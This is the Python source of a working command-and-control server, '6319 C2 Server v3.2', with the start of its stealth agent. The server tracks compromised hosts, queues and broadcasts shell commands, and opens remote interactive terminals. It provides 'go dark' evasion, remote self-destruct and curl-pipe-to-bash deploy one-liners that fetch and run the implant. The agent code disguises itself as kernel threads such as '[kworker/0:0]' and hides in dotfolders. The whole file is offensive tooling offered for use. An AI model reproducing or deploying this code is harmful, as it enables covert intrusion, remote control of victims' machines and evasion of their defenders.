#!/usr/bin/env python3
"""
6319 C2 Server v3.2 - Multi-Channel
Features:
- Multi-channel: STEALTH + PERSIST from same host
- Beacon mode: agents connect briefly, check for work, disconnect
- Wake queue: commands queued until agent checks in
- Connect/Disconnect on demand
- Sleep/Go Dark commands
- Self-destruct remote wipe
- Ping all (cached, no network)
- Full PTY terminal support
- Grouped hosts API with channel selector UI
"""

import socket
import threading
import json
import time
import os
import secrets
import uuid
import queue
import hashlib
import string
import random
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template, jsonify, request, Response, send_file, redirect, url_for, session

from crypto import SecureChannel, generate_secret, verify_secret
from webhooks import WebhookNotifier

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SESSION_SECRET', secrets.token_hex(32))

from flask_socketio import SocketIO, emit
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=120, ping_interval=25)

C2_SOCKET_PORT = int(os.environ.get('C2_SOCKET_PORT', 6318))
C2_WEB_PORT = int(os.environ.get('C2_WEB_PORT', 5000))
SERVER_IP = None

STEALTH_PATH = os.environ.get('STEALTH_PATH', 'stealth')
PERSIST_PATH = os.environ.get('PERSIST_PATH', 'x')
LOGIN_PATH = os.environ.get('LOGIN_PATH', '')
DASHBOARD_PATH = os.environ.get('DASHBOARD_PATH', '')
AUTH_KEY = os.environ.get('AUTH_KEY', '')

app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

def generate_random_path(length=26):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not AUTH_KEY:
            return f(*args, **kwargs)
        if not session.get('authenticated'):
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            login_url = f'/{LOGIN_PATH}' if LOGIN_PATH else '/login'
            return redirect(login_url)
        return f(*args, **kwargs)
    return decorated


def detect_server_ip():
    global SERVER_IP
    if os.environ.get('C2_IP'):
        SERVER_IP = os.environ.get('C2_IP')
        return SERVER_IP
    if os.environ.get('REPLIT_DEV_DOMAIN'):
        SERVER_IP = os.environ.get('REPLIT_DEV_DOMAIN')
        return SERVER_IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        SERVER_IP = s.getsockname()[0]
        s.close()
        return SERVER_IP
    except:
        pass
    try:
        import urllib.request
        SERVER_IP = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode()
        return SERVER_IP
    except:
        pass
    SERVER_IP = 'localhost'
    return SERVER_IP


def is_replit_domain():
    return '.replit.dev' in (SERVER_IP or '')


clients = {}
clients_lock = threading.Lock()
wake_queue = {}
wake_queue_lock = threading.Lock()
command_results = {}
pty_sessions = {}
pty_sessions_lock = threading.Lock()
notifier = WebhookNotifier()


class Client:
    def __init__(self, conn, addr, client_id, secret):
        self.conn = conn
        self.addr = addr
        self.id = client_id
        self.secret = secret
        self.channel = SecureChannel(secret)
        self.hostname = "unknown"
        self.os_info = "unknown"
        self.user = "unknown"
        self.arch = "unknown"
        self.pid = 0
        self.hidden_name = ""
        self.pty_support = False
        self.beacon_mode = True
        self.agent_channel = "stealth"
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.last_beacon = datetime.now()
        self.alive = True
        self.online = False
        self.pty_sessions = set()
        self._send_lock = threading.Lock()
        self.send_queue = queue.Queue()
        self.pending_exec = {}
        self.exec_counter = 0
        self.status = 'sleeping'
        
    def to_dict(self):
        now = datetime.now()
        last_seen_seconds = (now - self.last_seen).total_seconds()
        
        if self.online:
            status = 'online'
        elif last_seen_seconds < 600:
            status = 'beacon'
        elif last_seen_seconds < 3600:
            status = 'sleeping'
        else:
            status = 'dark'
        
        return {
            'id': self.id,
            'secret': self.secret[:8] + '...' if self.secret else '',
            'ip': self.addr[0],
            'port': self.addr[1],
            'hostname': self.hostname,
            'os': self.os_info,
            'user': self.user,
            'arch': self.arch,
            'pid': self.pid,
            'hidden_as': self.hidden_name,
            'pty_support': self.pty_support,
            'beacon_mode': self.beacon_mode,
            'channel': self.agent_channel,
            'connected_at': self.connected_at.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen_ago': f'{int(last_seen_seconds)}s ago' if last_seen_seconds < 60 else f'{int(last_seen_seconds/60)}m ago',
            'alive': self.alive,
            'online': self.online,
            'status': status,
            'uptime': str(now - self.connected_at).split('.')[0],
            'encrypted': True
        }

    def send(self, data):
        with self._send_lock:
            try:
                frame = self.channel.encrypt_frame(data)
                self.conn.sendall(frame)
                return True
            except:
                self.alive = False
                return False
    
    def queue_send(self, data):
        self.send_queue.put(data)
    
    def recv_frame(self):
        try:
            lb = b''
            while len(lb) < 4:
                c = self.conn.recv(4 - len(lb))
                if not c:
                    return None
                lb += c
            length = int.from_bytes(lb, 'big')
            if length > 10 * 1024 * 1024:
                return None
            data = b''
            while len(data) < length:
                c = self.conn.recv(min(8192, length - len(data)))
                if not c:
                    return None
                data += c
            self.last_seen = datetime.now()
            return self.channel.decrypt(data)
        except socket.timeout:
            return "timeout"
        except:
            return None


def get_client_key(addr, hostname, channel='stealth'):
    """Generate stable client key based on IP + hostname + channel"""
    return hashlib.md5(f"{addr[0]}:{hostname}:{channel}".encode()).hexdigest()[:12]


def client_sender_thread(client):
    while client.alive and client.online:
        try:
            data = client.send_queue.get(timeout=0.5)
            if data is None:
                break
            client.send(data)
        except queue.Empty:
            pass
        except:
            client.alive = False
            break


def client_reader_thread(client, client_id):
    while client.alive and client.online:
        try:
            client.conn.settimeout(1.0)
            msg = client.recv_frame()
            
            if msg is None:
                client.online = False
                break
            
            if msg == "timeout":
                continue
            
            msg_type = msg.get('type', msg.get('status', ''))
            
            if msg_type == 'pong' or msg.get('status') == 'pong':
                continue
            
            elif msg_type == 'pty_data':
                session_id = msg.get('session_id')
                data = msg.get('data', '')
                with pty_sessions_lock:
                    if session_id in pty_sessions:
                        ws_sid = pty_sessions[session_id].get('ws_sid')
                        if ws_sid:
                            socketio.emit('pty_output', {'session_id': session_id, 'data': data}, to=ws_sid)
            
            elif msg_type == 'pty_opened':
                session_id = msg.get('session_id')
                with pty_sessions_lock:
                    if session_id in pty_sessions:
                        ws_sid = pty_sessions[session_id].get('ws_sid')
                        if ws_sid:
                            socketio.emit('pty_ready', {'session_id': session_id}, to=ws_sid)
            
            elif msg_type == 'pty_exit':
                session_id = msg.get('session_id')
                code = msg.get('code', -1)
                with pty_sessions_lock:
                    if session_id in pty_sessions:
                        ws_sid = pty_sessions[session_id].get('ws_sid')
                        if ws_sid:
                            socketio.emit('pty_closed', {'session_id': session_id, 'code': code}, to=ws_sid)
                        del pty_sessions[session_id]
                client.pty_sessions.discard(session_id)
            
            elif msg.get('status') in ['sleeping', 'going_dark', 'destroying', 'disconnected']:
                client.online = False
                if msg.get('status') == 'destroying':
                    client.alive = False
                print(f"[-] Agent {client.hostname}: {msg.get('status')}")
                break
            
            else:
                if 'stdout' in msg or 'stderr' in msg or 'error' in msg or 'code' in msg:
                    if client_id not in command_results:
                        command_results[client_id] = []
                    cmd_id = client.exec_counter - 1
                    cmd_text = client.pending_exec.pop(cmd_id, 'unknown')
                    command_results[client_id].append({
                        'cmd': {'data': cmd_text},
                        'result': msg,
                        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
                    
        except:
            break
    
    client.online = False
    cleanup_client_pty_sessions(client_id)


def cleanup_client_pty_sessions(client_id):
    with pty_sessions_lock:
        to_remove = [sid for sid, info in pty_sessions.items() if info.get('client_id') == client_id]
        for sid in to_remove:
            ws_sid = pty_sessions[sid].get('ws_sid')
            if ws_sid:
                socketio.emit('pty_closed', {'session_id': sid, 'code': -1}, to=ws_sid)
            del pty_sessions[sid]


def ping_thread(client):
    while client.alive and client.online:
        time.sleep(15)
        if client.alive and client.online:
            client.queue_send({'cmd': 'ping'})


def handle_beacon(conn, addr, secret, crypto_channel, info):
    """Handle beacon check-in: quick connect, check queue, respond, disconnect"""
    hostname = info.get('hostname', 'unknown')
    agent_channel = info.get('channel', 'stealth')
    client_key = get_client_key(addr, hostname, agent_channel)
    
    with clients_lock:
        if client_key in clients:
            client = clients[client_key]
            client.last_seen = datetime.now()
            client.last_beacon = datetime.now()
            client.conn = conn
            client.channel = crypto_channel
            client.secret = secret
            client.hidden_name = info.get('hidden_name', client.hidden_name)
        else:
            client = Client(conn, addr, client_key, secret)
            client.hostname = hostname
            client.os_info = info.get('os', 'unknown')
            client.user = info.get('user', 'unknown')
            client.arch = info.get('arch', 'unknown')
            client.pid = info.get('pid', 0)
            client.hidden_name = info.get('hidden_name', '')
            client.pty_support = info.get('pty_support', False)
            client.beacon_mode = info.get('beacon_mode', True)
            client.agent_channel = agent_channel
            clients[client_key] = client
            
            print(f"[+] New beacon: {client.hostname} ({client.os_info}) - {client.user}")
            
            if notifier.is_configured():
                threading.Thread(target=notifier.notify_agent_connected, args=({
                    'hostname': client.hostname,
                    'os': client.os_info,
                    'user': client.user,
                    'ip': addr[0]
                },), daemon=True).start()
    
    with wake_queue_lock:
        has_work = client_key in wake_queue and len(wake_queue[client_key]) > 0
        sleep_override = 0
        pending_commands = []
        
        if has_work:
            for cmd in wake_queue[client_key]:
                cmd_type = cmd.get('type', '')
                if cmd_type == 'sleep':
                    minutes = cmd.get('minutes', 60)
                    sleep_override = minutes * 60
                    pending_commands.append({'type': 'sleep', 'seconds': sleep_override})
                    print(f"[*] Sending sleep ({minutes}m) to beacon: {client.hostname}")
                elif cmd_type == 'go_dark':
                    hours = cmd.get('hours', 24)
                    sleep_override = hours * 3600
                    pending_commands.append({'type': 'go_dark', 'seconds': sleep_override})
                    print(f"[*] Sending go_dark ({hours}h) to beacon: {client.hostname}")
                elif cmd_type == 'self_destruct':
                    pending_commands.append({'type': 'self_destruct'})
                    print(f"[!] Sending self_destruct to beacon: {client.hostname}")
                elif cmd_type == 'wake':
                    pending_commands.append({'type': 'connect_now'})
                    print(f"[*] Sending connect_now to beacon: {client.hostname}")
            wake_queue[client_key] = []
    
    response = {'status': 'ok', 'id': client_key, 'has_work': has_work, 'sleep': sleep_override}
    if pending_commands:
        response['commands'] = pending_commands
    
    client.send(response)
    conn.close()
    
    print(f"[*] Beacon from {client.hostname}: has_work={has_work}, commands={len(pending_commands)}")


def handle_interactive(conn, addr, secret, crypto_channel, info):
    """Handle full interactive session"""
    hostname = info.get('hostname', 'unknown')
    agent_channel = info.get('channel', 'stealth')
    client_key = get_client_key(addr, hostname, agent_channel)
    
    with clients_lock:
        if client_key in clients:
            client = clients[client_key]
            client.conn = conn
            client.channel = crypto_channel
            client.secret = secret
            client.last_seen = datetime.now()
            client.online = True
            client.alive = True
            client.hidden_name = info.get('hidden_name', client.hidden_name)
        else:
            client = Client(conn, addr, client_key, secret)
            client.hostname = hostname
            client.os_info = info.get('os', 'unknown')
            client.user = info.get('user', 'unknown')
            client.arch = info.get('arch', 'unknown')
            client.pid = info.get('pid', 0)
            client.hidden_name = info.get('hidden_name', '')
            client.pty_support = info.get('pty_support', False)
            client.beacon_mode = info.get('beacon_mode', True)
            client.agent_channel = agent_channel
            client.online = True
            clients[client_key] = client
    
    print(f"[+] Interactive session: {client.hostname} ({client.os_info})")
    
    client.send({'status': 'ok', 'id': client_key})
    
    with wake_queue_lock:
        if client_key in wake_queue:
            for cmd in wake_queue[client_key]:
                client.queue_send(cmd)
            wake_queue[client_key] = []
    
    sender = threading.Thread(target=client_sender_thread, args=(client,), daemon=True)
    reader = threading.Thread(target=client_reader_thread, args=(client, client_key), daemon=True)
    pinger = threading.Thread(target=ping_thread, args=(client,), daemon=True)
    
    sender.start()
    reader.start()
    pinger.start()
    
    reader.join()
    
    client.online = False
    client.send_queue.put(None)
    
    try:
        conn.close()
    except:
        pass
    
    print(f"[-] Session ended: {client.hostname}")


def handle_client(conn, addr):
    conn.settimeout(30)
    
    try:
        lb = conn.recv(4)
        if len(lb) < 4:
            conn.close()
            return
        length = int.from_bytes(lb, 'big')
        if length > 65536:
            conn.close()
            return
        data = b''
        while len(data) < length:
            c = conn.recv(min(4096, length - len(data)))
            if not c:
                conn.close()
                return
            data += c
        
        init = json.loads(data.decode())
        secret = init.get('secret', '')
        mode = init.get('mode', 'interactive')
        
        if not verify_secret(secret):
            conn.close()
            return
        
        channel = SecureChannel(secret)
        
    except Exception as e:
        conn.close()
        return
    
    try:
        enc_info = b''
        lb = conn.recv(4)
        if len(lb) < 4:
            conn.close()
            return
        info_len = int.from_bytes(lb, 'big')
        while len(enc_info) < info_len:
            c = conn.recv(min(4096, info_len - len(enc_info)))
            if not c:
                conn.close()
                return
            enc_info += c
        info = channel.decrypt(enc_info)
        if not info:
            conn.close()
            return
        
    except:
        conn.close()
        return
    
    if mode == 'beacon':
        handle_beacon(conn, addr, secret, channel, info)
    else:
        handle_interactive(conn, addr, secret, channel, info)


def socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', C2_SOCKET_PORT))
    server.listen(100)
    
    print(f"[*] C2 Socket listening on port {C2_SOCKET_PORT} (encrypted)")
    
    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            print(f"[-] Socket error: {e}")


@socketio.on('connect')
def ws_connect():
    print(f"[WS] Client connected: {request.sid}")


@socketio.on('disconnect')
def ws_disconnect():
    sid = request.sid
    with pty_sessions_lock:
        to_close = [(session_id, info) for session_id, info in pty_sessions.items() if info.get('ws_sid') == sid]
    
    for session_id, info in to_close:
        client_id = info.get('client_id')
        with clients_lock:
            if client_id in clients and clients[client_id].online:
                clients[client_id].queue_send({'type': 'pty_close', 'session_id': session_id})
                clients[client_id].pty_sessions.discard(session_id)
        
        with pty_sessions_lock:
            if session_id in pty_sessions:
                del pty_sessions[session_id]
    
    print(f"[WS] Client disconnected: {sid}")


@socketio.on('pty_open')
def ws_pty_open(data):
    client_id = data.get('client_id')
    cols = data.get('cols', 80)
    rows = data.get('rows', 24)
    
    with clients_lock:
        if client_id not in clients:
            emit('error', {'message': 'Client not found'})
            return
        
        client = clients[client_id]
        if not client.online:
            emit('error', {'message': 'Client offline - queue connect first'})
            return
        
        if not client.pty_support:
            emit('error', {'message': 'Client does not support PTY'})
            return
        
        session_id = str(uuid.uuid4())[:8]
        
        with pty_sessions_lock:
            pty_sessions[session_id] = {
                'client_id': client_id,
                'ws_sid': request.sid,
                'cols': cols,
                'rows': rows
            }
        client.pty_sessions.add(session_id)
        
        client.queue_send({
            'type': 'pty_open',
            'session_id': session_id,
            'cols': cols,
            'rows': rows
        })
    
    emit('pty_opening', {'session_id': session_id})


@socketio.on('pty_input')
def ws_pty_input(data):
    session_id = data.get('session_id')
    input_data = data.get('data', '')
    
    with pty_sessions_lock:
        if session_id not in pty_sessions:
            return
        client_id = pty_sessions[session_id].get('client_id')
    
    with clients_lock:
        if client_id in clients and clients[client_id].online:
            clients[client_id].queue_send({
                'type': 'pty_data',
                'session_id': session_id,
                'data': input_data
            })


@socketio.on('pty_resize')
def ws_pty_resize(data):
    session_id = data.get('session_id')
    cols = data.get('cols', 80)
    rows = data.get('rows', 24)
    
    with pty_sessions_lock:
        if session_id not in pty_sessions:
            return
        pty_sessions[session_id]['cols'] = cols
        pty_sessions[session_id]['rows'] = rows
        client_id = pty_sessions[session_id].get('client_id')
    
    with clients_lock:
        if client_id in clients and clients[client_id].online:
            clients[client_id].queue_send({
                'type': 'pty_resize',
                'session_id': session_id,
                'cols': cols,
                'rows': rows
            })


@socketio.on('pty_close')
def ws_pty_close(data):
    session_id = data.get('session_id')
    
    with pty_sessions_lock:
        if session_id not in pty_sessions:
            return
        client_id = pty_sessions[session_id].get('client_id')
        del pty_sessions[session_id]
    
    with clients_lock:
        if client_id in clients and clients[client_id].online:
            clients[client_id].queue_send({'type': 'pty_close', 'session_id': session_id})
            clients[client_id].pty_sessions.discard(session_id)


def get_server_url():
    if os.environ.get('C2_URL'):
        return os.environ.get('C2_URL')
    ip = SERVER_IP or detect_server_ip()
    if is_replit_domain():
        return f'https://{ip}'
    return f'http://{ip}:{C2_WEB_PORT}'


def get_c2_host():
    if os.environ.get('C2_HOST'):
        return os.environ.get('C2_HOST')
    return SERVER_IP or detect_server_ip()


def login_page_handler():
    if not AUTH_KEY:
        dashboard_url = f'/{DASHBOARD_PATH}' if DASHBOARD_PATH else '/'
        return redirect(dashboard_url)
    
    error = None
    if request.method == 'POST':
        key = request.form.get('key', '')
        if key == AUTH_KEY:
            session['authenticated'] = True
            session.permanent = True
            dashboard_url = f'/{DASHBOARD_PATH}' if DASHBOARD_PATH else '/'
            return redirect(dashboard_url)
        error = 'Invalid key'
    
    return render_template('login.html', error=error)


def logout_handler():
    session.pop('authenticated', None)
    login_url = f'/{LOGIN_PATH}' if LOGIN_PATH else '/login'
    return redirect(login_url)


@require_auth
def dashboard_handler():
    return render_template('index.html')


def root_redirect():
    if DASHBOARD_PATH:
        return '', 404
    return dashboard_handler()


@app.route('/api/clients')
@require_auth
def api_clients():
    """Return hosts grouped by hostname, each with available channels"""
    with clients_lock:
        # Group clients by IP+hostname
        hosts = {}
        for c in clients.values():
            host_key = f"{c.addr[0]}:{c.hostname}"
            if host_key not in hosts:
                hosts[host_key] = {
                    'hostname': c.hostname,
                    'ip': c.addr[0],
                    'channels': {}
                }
            # Add channel info
            channel_name = c.agent_channel
            hosts[host_key]['channels'][channel_name] = c.to_dict()
        
        # Convert to list with computed overall status
        result = []
        for host_key, host_data in hosts.items():
            channels = host_data['channels']
            
            # Determine overall status (best of all channels)
            any_online = any(ch['online'] for ch in channels.values())
            
            if any_online:
                overall_status = 'online'
            else:
                # Find best status among channels
                statuses = [ch['status'] for ch in channels.values()]
                if 'beacon' in statuses:
                    overall_status = 'beacon'
                elif 'sleeping' in statuses:
                    overall_status = 'sleeping'
                else:
                    overall_status = 'dark'
            
            # Get most recent last_seen
            best_channel = max(channels.values(), key=lambda x: x['last_seen'])
            
            result.append({
                'host_key': host_key,
                'hostname': host_data['hostname'],
                'ip': host_data['ip'],
                'channels': channels,
                'channel_list': list(channels.keys()),
                'overall_status': overall_status,
                'overall_online': any_online,
                'last_seen': best_channel['last_seen'],
                'last_seen_ago': best_channel['last_seen_ago'],
                'os': best_channel['os'],
                'user': best_channel['user'],
                'arch': best_channel['arch']
            })
        
        return jsonify(sorted(result, key=lambda x: (not x['overall_online'], x['overall_status'] != 'beacon', x['hostname'])))


@app.route('/api/clients/<client_id>/connect', methods=['POST'])
@require_auth
def api_connect(client_id):
    """Queue wake signal - agent will connect on next beacon"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if client.online:
            return jsonify({'status': 'already_online'})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'type': 'wake'})
    
    return jsonify({'status': 'queued', 'message': 'Will connect on next beacon'})


@app.route('/api/clients/<client_id>/disconnect', methods=['POST'])
@require_auth
def api_disconnect(client_id):
    """Disconnect active session"""
    print(f"[*] Disconnect request for: {client_id}")
    with clients_lock:
        if client_id not in clients:
            print(f"[-] Client not found: {client_id}")
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            print(f"[-] Client already offline: {client_id}")
            return jsonify({'status': 'already_offline'})
        print(f"[*] Sending disconnect to: {client.hostname}")
        client.queue_send({'type': 'disconnect'})
    
    return jsonify({'status': 'disconnecting'})


@app.route('/api/clients/<client_id>/sleep', methods=['POST'])
@require_auth
def api_sleep(client_id):
    """Put agent to sleep for specified minutes"""
    minutes = request.json.get('minutes', 60) if request.json else 60
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        if client.online:
            client.queue_send({'type': 'sleep', 'minutes': minutes})
            return jsonify({'status': 'sleeping', 'minutes': minutes})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'type': 'sleep', 'minutes': minutes})
    
    return jsonify({'status': 'queued', 'minutes': minutes})


@app.route('/api/clients/<client_id>/dark', methods=['POST'])
@require_auth
def api_go_dark(client_id):
    """Go dark for specified hours (no beacons)"""
    hours = request.json.get('hours', 24) if request.json else 24
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        if client.online:
            client.queue_send({'type': 'go_dark', 'hours': hours})
            return jsonify({'status': 'going_dark', 'hours': hours})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'type': 'go_dark', 'hours': hours})
    
    return jsonify({'status': 'queued', 'hours': hours})


@app.route('/api/clients/<client_id>/destroy', methods=['POST'])
@require_auth
def api_destroy(client_id):
    """Self-destruct agent and remove from panel"""
    sent_destroy = False
    was_online = False
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        was_online = client.online
        
        if client.online:
            client.queue_send({'type': 'self_destruct'})
            sent_destroy = True
        
        del clients[client_id]
    
    if was_online:
        with wake_queue_lock:
            if client_id in wake_queue:
                del wake_queue[client_id]
        print(f"[!] Client destroyed (online): {client_id}")
        return jsonify({'status': 'destroyed', 'message': 'Agent wiped and removed from panel'})
    else:
        with wake_queue_lock:
            if client_id not in wake_queue:
                wake_queue[client_id] = []
            wake_queue[client_id] = [{'type': 'self_destruct'}]
        print(f"[!] Client removed, destroy queued: {client_id}")
        return jsonify({'status': 'queued', 'message': 'Removed from panel. Destroy queued for next beacon.'})


@app.route('/api/clients/<client_id>/exec', methods=['POST'])
@require_auth
def api_exec(client_id):
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        cmd = request.json.get('cmd', '') if request.json else ''
        if not cmd:
            return jsonify({'error': 'No command'}), 400
        
        if client.online:
            client.pending_exec[client.exec_counter] = cmd
            client.exec_counter += 1
            client.queue_send({'cmd': 'exec', 'data': cmd})
            return jsonify({'status': 'sent'})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'cmd': 'exec', 'data': cmd})
    
    return jsonify({'status': 'queued'})


@app.route('/api/clients/<client_id>/results')
@require_auth
def api_results(client_id):
    return jsonify(command_results.get(client_id, []))


@app.route('/api/clients/<client_id>/shell')
@require_auth
def api_shell(client_id):
    def generate():
        last = 0
        while True:
            results = command_results.get(client_id, [])
            if len(results) > last:
                for r in results[last:]:
                    yield f"data: {json.dumps(r)}\n\n"
                last = len(results)
            time.sleep(0.5)
    return Response(generate(), mimetype='text/event-stream')


@app.route('/api/ping_all', methods=['POST'])
@require_auth
def api_ping_all():
    """Check all agents status from cache (no network traffic)"""
    now = datetime.now()
    results = []
    
    with clients_lock:
        for cid, client in clients.items():
            last_seen_seconds = (now - client.last_seen).total_seconds()
            results.append({
                'id': cid,
                'hostname': client.hostname,
                'ip': client.addr[0],
                'online': client.online,
                'last_seen': client.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
                'last_seen_ago': f'{int(last_seen_seconds)}s' if last_seen_seconds < 60 else f'{int(last_seen_seconds/60)}m',
                'status': 'online' if client.online else ('beacon' if last_seen_seconds < 600 else ('sleeping' if last_seen_seconds < 3600 else 'dark'))
            })
    
    return jsonify({
        'total': len(results),
        'online': sum(1 for r in results if r['online']),
        'beacon': sum(1 for r in results if r['status'] == 'beacon'),
        'sleeping': sum(1 for r in results if r['status'] == 'sleeping'),
        'dark': sum(1 for r in results if r['status'] == 'dark'),
        'clients': results
    })


@app.route('/api/stats')
@require_auth
def api_stats():
    now = datetime.now()
    hosts = {}
    
    with clients_lock:
        for cid, client in clients.items():
            host_key = f"{client.addr[0]}_{client.hostname}"
            if host_key not in hosts:
                hosts[host_key] = {'online': False, 'dead': True}
            
            if client.online:
                hosts[host_key]['online'] = True
                hosts[host_key]['dead'] = False
            elif (now - client.last_seen).total_seconds() <= 300:
                hosts[host_key]['dead'] = False
    
    total = len(hosts)
    online = sum(1 for h in hosts.values() if h['online'])
    dead = sum(1 for h in hosts.values() if h['dead'])
    
    server_url = get_server_url()
    return jsonify({
        'total': total,
        'online': online,
        'dead': dead,
        'deploy_stealth': f'bash -c "$(curl -fsSL {server_url}/{STEALTH_PATH})"',
        'deploy_persist': f'bash -c "$(curl -fsSL {server_url}/{PERSIST_PATH})"'
    })


@app.route('/api/broadcast', methods=['POST'])
@require_auth
def api_broadcast():
    cmd = request.json.get('cmd', '') if request.json else ''
    if not cmd:
        return jsonify({'error': 'No command'}), 400
    
    sent = 0
    queued = 0
    
    with clients_lock:
        for cid, client in clients.items():
            if client.online:
                client.pending_exec[client.exec_counter] = cmd
                client.exec_counter += 1
                client.queue_send({'cmd': 'exec', 'data': cmd})
                sent += 1
            else:
                with wake_queue_lock:
                    if cid not in wake_queue:
                        wake_queue[cid] = []
                    wake_queue[cid].append({'cmd': 'exec', 'data': cmd})
                queued += 1
    
    return jsonify({'status': 'ok', 'sent': sent, 'queued': queued})


@app.route('/install.sh')
def install_server_script():
    """Install script for deploying C2 server on VPS"""
    script = '''#!/bin/bash
set -e

echo "[*] Installing 6319 C2 Server v3.2..."

# Detect external IP
VPS_IP=$(curl -fsSL https://api.ipify.org 2>/dev/null || curl -fsSL https://ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
echo "[*] Detected IP: $VPS_IP"

# Install dependencies
apt-get update -qq
apt-get install -y -qq python3 python3-pip curl >/dev/null 2>&1

# Create directory
mkdir -p /opt/6319
cd /opt/6319

# Download server files
SERVER_URL="''' + get_server_url() + '''"
curl -fsSL "$SERVER_URL/bin/server.py" -o server.py
curl -fsSL "$SERVER_URL/bin/agent_stealth.py" -o agent_stealth.py
curl -fsSL "$SERVER_URL/bin/crypto.py" -o crypto.py
curl -fsSL "$SERVER_URL/bin/webhooks.py" -o webhooks.py
mkdir -p templates static
curl -fsSL "$SERVER_URL/bin/templates/index.html" -o templates/index.html
curl -fsSL "$SERVER_URL/bin/static/style.css" -o static/style.css

# Install Python deps
pip3 install flask flask-socketio pynacl gevent gevent-websocket -q

# Create systemd service with detected IP
cat > /etc/systemd/system/6319-c2.service << EOF
[Unit]
Description=6319 C2 Server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/6319
ExecStart=/usr/bin/python3 /opt/6319/server.py
Restart=always
RestartSec=5
Environment=C2_IP=$VPS_IP

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable 6319-c2
systemctl start 6319-c2

echo ""
echo "[+] 6319 C2 Server installed and running"
echo "[*] Web UI: http://$VPS_IP:5000"
echo "[*] Agents port: 6318"
echo ""
echo "[DEPLOY AGENTS]"
echo "  curl -fsSL http://$VPS_IP:5000/stealth | bash"
'''
    return Response(script, mimetype='text/plain')


@app.route('/bin/<path:filename>')
def serve_bin(filename):
    """Serve server files for easy updates"""
    allowed_files = {
        'server.py': ('server.py', 'text/plain'),
        'agent_stealth.py': ('agent_stealth.py', 'text/plain'),
        'crypto.py': ('crypto.py', 'text/plain'),
        'webhooks.py': ('webhooks.py', 'text/plain'),
        'install.sh': ('install.sh', 'text/plain'),
        'templates/index.html': ('templates/index.html', 'text/html'),
        'static/style.css': ('static/style.css', 'text/css')
    }
    
    if filename not in allowed_files:
        return "Not found", 404
    
    path, mime = allowed_files[filename]
    filepath = os.path.join(os.path.dirname(__file__), path)
    if os.path.exists(filepath):
        return send_file(filepath, mimetype=mime)
    return "File not found", 404


STEALTH_AGENT_CODE = '''
import socket,json,hashlib,subprocess,os,sys,platform,getpass,time,select,struct,pty,fcntl,termios,signal,random,shutil,glob as gm
try:
    import ctypes;HAS_CTYPES=True
except:HAS_CTYPES=False
import nacl.secret
KNAMES=["[kworker/0:0]","[ksmd]","[kswapd0]","[watchdogd]","[rcu_preempt]","[migration/0]"]
DIRS=[os.path.expanduser("~/.config/.htop"),os.path.expanduser("~/.cache/.fontconfig")]
class Ch:
    def __init__(s,sec):s.box=nacl.secret.SecretBox(hashlib.sha256(sec.encode()).digest())
    def enc(s,d):ct=s.box.encrypt(json.dumps(d).encode());return len(ct).to_bytes(4,'big')+ct
    def dec(s,sock):
        try:
            sock.settimeout(30);lb=b''
            while len(lb)<4:
                c=sock.recv(4-len(lb))
                if not c:return None
                lb+=c
            l=int.from_bytes(lb,'big')
            if l>10*1024*1024:return None
            d=b''
            while len(d)<l:
                c=sock.recv(min(8192,l-len(d)))
                if not c:return None
                d+=c
            return json.loads(s.box.decrypt(d))
        except:return None
class PTY:
    def __init__(s,sid,cols=80,rows=24,cwd=None):
        s.sid=sid;s.mfd,sfd=pty.openpty()
        env=os.environ.copy();env['TERM']='xterm-256color';env['COLUMNS']=str(cols);env['LINES']=str(rows)
        s.pid=os.fork()
        if s.pid==0:
            os.setsid();os.dup2(sfd,0);os.dup2(sfd,1);os.dup2(sfd,2);os.close(s.mfd);os.close(sfd)
            if cwd and os.path.isdir(cwd):os.chdir(cwd)
            sh='/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
            os.execve(sh,[sh,'-i'],env)
        os.close(sfd);fl=fcntl.fcntl(s.mfd,fcntl.F_GETFL);fcntl.fcntl(s.mfd,fcntl.F_SETFL,fl|os.O_NONBLOCK);s.rsz(cols,rows);s.alive=True
